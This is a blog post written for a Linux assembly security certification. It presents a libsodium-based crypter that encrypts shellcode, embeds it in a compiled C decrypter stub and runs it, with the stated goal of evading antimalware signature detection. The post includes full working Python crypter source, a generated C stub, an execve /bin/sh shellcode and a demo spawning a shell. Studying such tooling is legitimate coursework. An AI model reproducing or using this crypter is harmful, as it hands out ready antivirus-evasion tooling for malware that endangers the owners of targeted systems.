---
layout: post
title: Custom Crypter
---

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:*

*http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/*

*Student ID: SLAE - 1187*

Introduction
============

Today we'll discuss a simple custom crypter I've written. A crypter is a tool that takes code (usually malicious) and uses encryption techniques to obfuscate it. The encrypted code is embedded into a decrypter program that when ran decrypts it and passes execution to it. The aim here is avoiding antimalware and other analysis, though not necessarily human analysis. When in its crypted form a shellcode or other malicious software is indistinguishable from random data. In order to run, especially if it has to be automatic, a key needs to be provided to the decrypter. In some cases this is done manually at runtime, however in the crypter I'll be describing today the key is embedded alongside the encrypted payload. This is normally an inadvisable practice when you have a requirement for confidentiality. In this case, our goal is to avoid automated detection, particularly signature based detection. In this case shipping the key alongside the encrypted payload is acceptable. We can try as hard as we like to obfuscate and hide the true content of our code, but once we've deployed it the deconstruction of it is just a matter of time. Unlike most conventional weapons, when one infects a computer with malware, the infection comes with its blueprints. Imagine firing a missile and included in its payload is its own blueprints.


The Libsodium Crypter
=====================

My crypter uses libsodium for cryptographic operations. One of the most time tested and consistent pieces of advice I've given out in my information security career is that one should **never** roll (implement) their own crypto. Now, this principle is more for applications that require real confidentiality, but I've decided I should probably follow my own advice even in this case and use a library. Libsodium is based on the public domain NaCl (read as 'salt') cryptographic library written by Daniel J Bernstein. It implements the ChaCha20 stream cipher with the Poly1305 message authentication code (MAC) for symmetric encryption, both of which are standardized by the IETF. This selection of algorithms is one of the strongest commonly available.

The crypter takes a filename and a string of hex encoded bytes (i.e. `\x41\x42\x43\x44\xAB\xCD`) and decodes and encrypts the bytes. It then calculates the size of the original code and its encrypted form and inserts this information along with the encrypted code, symmetric key, and nonce (a non-secret random value) into a decrypter stub written in C. This stub is written out to a filename provided by the user and compiled using GCC.

The compiler is asked to statically link glibc and libsodium. The final executable is not dynamic, and does not require any shared libraries installed on the target system to function. This is important, as while libsodium is popular it is not default on most systems and is relatively new and may not be on our target. The static linking of glibc, while usually undesirable, is another important factor. Discrepancies in glibc versions between the machine on which the crypter is ran and the target machine that the output will be deployed on can stop execution in its tracks.

### Dependancies

In order to run the crypter and for the decrypter to be compiled, the machine running the crypter (NOT the target on which the decrypter produced will be ran) requires several packages. All of my development was done on Debian, so these should be the same on systems like Ubuntu and Kali, but you're on your own for RHEL based distros like Fedora and CentOS.

Running he following command as root should install all the run and build dependancies on Debian:

`apt install python3 python3-dev python3-pip libsodium-dev build-essential`

In addition, you'll need to install the python dependancies with pip3.

`pip3 install jinja2 pynacl`

At this point you should be able to run the crypter.

### Usage

My crypter's usage is as follows:

```
root@mountain:~# ./libsodium_crypter.py
Usage: ./libsodium_crypter.py <destination filename> <hex_escaped_shellcode_to_crypt>
```

So here I'll crypt and run a simple execve payload that executes /bin//sh.

```
root@mountain:~# ./libsodium_crypter.py execve_crypted \x31\xd2\x31\xc0\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
Finished execve_crypted.elf
root@mountain:~# ls -l
total 1096
-rw-r--r-- 1 fbc216 fbc216     891 Jun 13 16:36 execve_crypted.c
-rwxr-xr-x 1 fbc216 fbc216 1102628 Jun 13 16:36 execve_crypted.elf
-rwxr-xr-x 1 fbc216 fbc216    3871 Jun 13 16:32 libsodium_crypter.py
root@mountain:~# ./execve_crypted.elf
# id
uid=0(root) gid=0(root) groups=0(root)
# echo $0
/bin//sh
```

You can see by running the crypted elf file, the shellcode passed to the crypter is executed.

Sources
=======

### Cryptor Script Source

This can also be found on github [here]().

```python
#!/usr/bin/env python3
"""
Custom libsodium crypter; generates a C source file with an encrypted
shellcode embedded in it. The C is compiled and statically linked to DJB's
public domain Networking and Cryptography Library (NaCl). The program
decrypts and passes execution to the embedded shellcode.
Usage: this_script.py <destination filename> <hex_escaped_shellcode_to_crypt>
Author: fbcsec
This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
Student ID: SLAE - 1187
"""

import subprocess
import sys
import os

from jinja2 import Template
import nacl.secret
import nacl.utils

C_TEMPLATE = Template("""
#include <sodium.h>


const unsigned char ciphertext[{{clen + 1}}] = "{{c}}";
unsigned long long ciphertext_len = {{clen}};

const unsigned char key[crypto_secretbox_KEYBYTES+1] = "{{k}}";
const unsigned char nonce[crypto_secretbox_NONCEBYTES+1] = "{{n}}";

unsigned char output[{{mlen}}];


int main(void) {

    int (*call_output)() = (int(*)())output;

    int sodium_init();
    if (crypto_secretbox_open_easy(output, ciphertext, ciphertext_len, nonce, key) != 0) {
        return 1;
    }

    call_output();

    return 0;
}

""")


def array_hex_str_to_ints(list_of_hex_strings):
    """This function accepts a list of strings containing hex digits and
    converts each item into bytes.
    For example, [21, 41, 42, 43] is converted into [b'!', b'A', b'B', b'C']
    """

    for item in range(0, len(list_of_hex_strings)):
        list_of_hex_strings[item] = int(list_of_hex_strings[item], 16)

    return list_of_hex_strings


def process_shellcode(shellcode_input):
    """Convert a string of hex values formatted as C-style hex escapes
    into an array of integers.
    Returns bytes"""

    split_shellcode = shellcode_input.split("x")
    split_shellcode = split_shellcode[1::]  # Remove bogus empty string at start of array

    processed_shellcode = bytes(array_hex_str_to_ints(split_shellcode))

    return processed_shellcode


def c_format_binary_data(data):
    hex_escaped = ''
    for byte in data:
        formatted_byte = '\\x{0:0{1}X}'.format(byte, 2)
        hex_escaped += formatted_byte
    return hex_escaped


def encrypt_shellcode(key, shellcode):
    box = nacl.secret.SecretBox(key)
    return box.encrypt(shellcode)


def main():

    if len(sys.argv) != 3:
        print("Usage: %s <destination filename> <hex_escaped_shellcode_to_crypt>" % sys.argv[0])
        raise SystemExit

    output_filename = sys.argv[1]

    input_shellcode = process_shellcode(sys.argv[2])

    key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)  # Generate random key

    encrypted = nacl.secret.SecretBox(key).encrypt(input_shellcode)  # Encrypt shellcode

    nonce = encrypted.nonce  # Extract nonce from EncryptedMessage object
    ciphertext = encrypted.ciphertext  # Extract ciphertext from EncryptedMessage object

    rendered_c_template = C_TEMPLATE.render(c=c_format_binary_data(ciphertext),  # Render the C decrypter file
                                            clen=len(ciphertext),
                                            k=c_format_binary_data(key),
                                            n=c_format_binary_data(nonce),
                                            mlen=len(input_shellcode))

    with open(output_filename + '.c', 'w+') as cfile:
        cfile.write(rendered_c_template)

    subprocess.call(['gcc', output_filename + '.c', '-fno-stack-protector', '-z', 'execstack', '-m32', '-o',
                     output_filename + '.elf', '-ggdb', '-static', '-pthread', '-lpthread', '/usr/lib/i386-linux-gnu/libsodium.a'])
    #os.remove(output_filename + '.c')
    print('Finished %s' % output_filename + '.elf')

if __name__ == '__main__':
    main()
```

### C Decrypter Stub Sample

This is a sample C source generated by the cryptor. A version of this can be found on github [here]().

```c
//
// Custom libsodium decrypter sample.
// Author: fbcsec
// This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
// http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
// Student ID: SLAE - 1187
//

#include <sodium.h>


const unsigned char ciphertext[51] = "\xB0\x79\x37\xDD\x26\x22\x51\xD5\xA7\x54\x34\x6E\xD4\x3F\xCF\x00\xB8\xD5\x4C\xE4\xE9\x43\xF1\xB6\x48\xB3\xEA\x42\xA9\x84\x6C\x07\x41\xA8\xE0\xB3\xAC\xDD\x73\x44\x9B\x52\x21\xF5\x68\x15\x87\x3E\xAD\x4A";
unsigned long long ciphertext_len = 50;

const unsigned char key[crypto_secretbox_KEYBYTES+1] = "\xD8\xA7\x97\x77\x9D\xCE\x60\x9C\xFD\x5C\x43\x17\x54\xAC\xED\xA4\xC7\x8F\x9F\xFE\x0D\xAA\xF3\x5B\x02\x7F\xB6\xB9\xDD\xD2\xC0\xB5";
const unsigned char nonce[crypto_secretbox_NONCEBYTES+1] = "\x52\x08\x3A\x39\xA4\x16\x5F\xB7\x63\x59\xE6\x13\x15\xB6\xF7\xFD\xF5\xE2\x1C\x91\xD0\x68\x3F\x53";

unsigned char output[34];


int main(void) {

    int (*call_output)() = (int(*)())output;

    int sodium_init();
    if (crypto_secretbox_open_easy(output, ciphertext, ciphertext_len, nonce, key) != 0) {
        return 1;
    }

    call_output();

    return 0;
}
```
